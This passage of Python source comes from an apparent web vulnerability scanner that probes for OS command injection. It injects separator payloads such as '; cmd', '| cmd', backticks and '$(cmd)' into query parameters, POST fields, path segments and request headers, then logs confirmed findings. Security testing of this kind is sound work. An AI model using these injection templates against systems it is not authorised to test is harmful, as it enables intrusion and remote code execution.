                            mut_query = dict(query_params)
                            mut_query[param_name] = [payload]
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                            ))

                            resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_error_based(
                                response=resp,
                                baseline=baseline_resp,
                                payload=payload,
                            )
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    param_vuln_found = True
                                    break

            # -------------------------------------------------------------
            # Vector 2: POST Body (JSON & Form-Urlencoded)
            # -------------------------------------------------------------
            post_fields: Dict[str, Any] = {}
            is_json_body = False
            if method == "POST" or body_data is not None:
                if isinstance(body_data, dict):
                    post_fields = dict(body_data)
                    is_json_body = True
                elif isinstance(body_data, str) and body_data.strip().startswith("{"):
                    try:
                        post_fields = json.loads(body_data)
                        is_json_body = True
                    except Exception:
                        pass
                elif raw_params and method == "POST":
                    post_fields = dict(raw_params)

            if post_fields:
                clean_target_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
                ))
                for field_name in list(post_fields.keys()):
                    post_vuln_found = False

                    # 2.1 Result-based
                    for entry in result_payload_entries:
                        cmd = entry["cmd"]
                        mutated_variants = self.generator.generate_mutated_payloads(cmd)
                        for payload in mutated_variants[:5]:
                            mut_body = dict(post_fields)
                            mut_body[field_name] = payload

                            if is_json_body:
                                resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=headers_data)
                            else:
                                resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=headers_data)

                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_result_based(resp, baseline=baseline_resp, payload_info=entry)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=clean_target_url,
                                        base_url=base_url,
                                        param=field_name,
                                        param_type="json" if is_json_body else "body",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    post_vuln_found = True
                                    break
                        if post_vuln_found:
                            break

                    # 2.2 Time-based
                    if not post_vuln_found:
                        for entry in time_payload_entries[:2]:
                            cmd = entry["cmd"]
                            mutated_variants = self.generator.generate_mutated_payloads(cmd)
                            for payload in mutated_variants[:3]:
                                mut_body = dict(post_fields)
                                mut_body[field_name] = payload

                                if is_json_body:
                                    resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=headers_data)
                                else:
                                    resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=headers_data)

                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_time_blind(resp, baseline_resp=baseline_resp, threshold=self.delay_threshold)
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=clean_target_url,
                                            base_url=base_url,
                                            param=field_name,
                                            param_type="json" if is_json_body else "body",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        post_vuln_found = True
                                        break
                            if post_vuln_found:
                                break

                    # 2.3 Error-based
                    if not post_vuln_found:
                        for payload in error_payloads[:4]:
                            mut_body = dict(post_fields)
                            mut_body[field_name] = payload

                            if is_json_body:
                                resp = self._execute_request(mission, "POST", clean_target_url, json_data=mut_body, headers=headers_data)
                            else:
                                resp = self._execute_request(mission, "POST", clean_target_url, data=mut_body, headers=headers_data)

                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_error_based(resp, baseline=baseline_resp, payload=payload)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{field_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=clean_target_url,
                                        base_url=base_url,
                                        param=field_name,
                                        param_type="json" if is_json_body else "body",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    post_vuln_found = True
                                    break

            # -------------------------------------------------------------
            # Vector 3: RESTful Path Segments
            # -------------------------------------------------------------
            path_segments = [s for s in parsed_url.path.strip("/").split("/") if s]
            if path_segments:
                for idx, segment in enumerate(path_segments):
                    # Fuzz ID-like or resource-like segments
                    if segment.isdigit() or len(segment) > 10 or segment in ("view", "item", "tools", "ping", "test", "run"):
                        for entry in result_payload_entries[:4]:
                            cmd = entry["cmd"]
                            for payload in [f"; {cmd}", f"| {cmd}", f"%0a{cmd}", f"`{cmd}`"]:
                                mutated_segs = list(path_segments)
                                mutated_segs[idx] = f"{segment}{payload}"
                                mut_path = "/" + "/".join(mutated_segs)
                                target_url = urllib.parse.urlunparse((
                                    parsed_url.scheme, parsed_url.netloc, mut_path,
                                    parsed_url.params, parsed_url.query, parsed_url.fragment,
                                ))

                                resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_result_based(resp, baseline=baseline_resp, payload_info=entry)
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:path_segment_{idx}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=target_url,
                                            base_url=base_url,
                                            param=f"path_segment_{idx}",
                                            param_type="path",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        break

            # -------------------------------------------------------------
            # Vector 4: HTTP Request Headers (User-Agent, Referer, Cookie, X-Forwarded-For)
            # -------------------------------------------------------------
            header_targets = [
                ("User-Agent", "Mozilla/5.0; {payload}"),
                ("Referer", "{base_url}/{payload}"),
                ("Cookie", "session_id={payload}"),
                ("X-Forwarded-For", "127.0.0.1; {payload}"),
                ("X-Client-IP", "127.0.0.1; {payload}"),
            ]
            clean_url = urllib.parse.urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path, "", "", ""
            ))
            for header_name, template_fmt in header_targets:
                for entry in result_payload_entries[:3]:
                    cmd = entry["cmd"]
                    for payload in [f"; {cmd}", f"| {cmd}", f"`{cmd}`", f"$({cmd})"]:
                        injected_val = template_fmt.format(payload=payload, base_url=base_url)
                        mut_headers = dict(headers_data)
                        mut_headers[header_name] = injected_val

                        resp = self._execute_request(mission, "GET", clean_url, headers=mut_headers)
                        if not resp:
                            continue

                        analysis = self.analyzer.analyze_result_based(resp, baseline=baseline_resp, payload_info=entry)
                        if analysis:
                            vuln_key = f"{parsed_url.path}:{header_name}:{analysis['template_id']}"
                            if vuln_key not in confirmed_vuln_keys:
                                confirmed_vuln_keys.add(vuln_key)
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=clean_url,
                                    base_url=base_url,
                                    param=header_name,
                                    param_type="header",
                                    payload=payload,
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    analysis=analysis,
                                )
                                detected_evidence.append(ev)
                                break

        logger.info(
            f"CommandInjectionCollector complete: {len(detected_evidence)} command injection vulnerability(ies) identified."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        analysis: Dict[str, Any],
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = analysis.get("template_id", "cmdi")
        technique = analysis.get("technique", "result_based")
        severity = analysis.get("severity", Severity.CRITICAL)
        if isinstance(severity, Severity):
            severity = severity.value
        confidence = analysis.get("confidence", 0.95)
        snippet = analysis.get("snippet", "")
        os_family = analysis.get("os_family", "generic")

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        technique_labels = {
            "result_based": f"Result-Based ({os_family.upper()})",
            "time_blind": "Time-Based Blind Delay",
            "error_based": "Error-Based Shell Trigger",
        }
        tech_label = technique_labels.get(technique, technique)

        title = f"Command Injection: {param} on {target_url}"
        description = (
            f"OS Command Injection ({tech_label}) vulnerability confirmed on endpoint {target_url} "
            f"via {param_type} parameter '{param}' using payload '{payload}'. "
            f"Evidence: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="command_injection",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="command_injection_collector",
            ),
            tags=["command_injection", "cmdi", "rce", technique, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "command_injection",
                "severity": severity,
                "technique": technique,
                "template_id": template_id,
                "os_family": os_family,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"Command Injection ({tech_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "technique": technique,
                "os_family": os_family,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"Command Injection ({tech_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id if hasattr(ev, "evidence_id") else getattr(ev, "id", ""), ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)
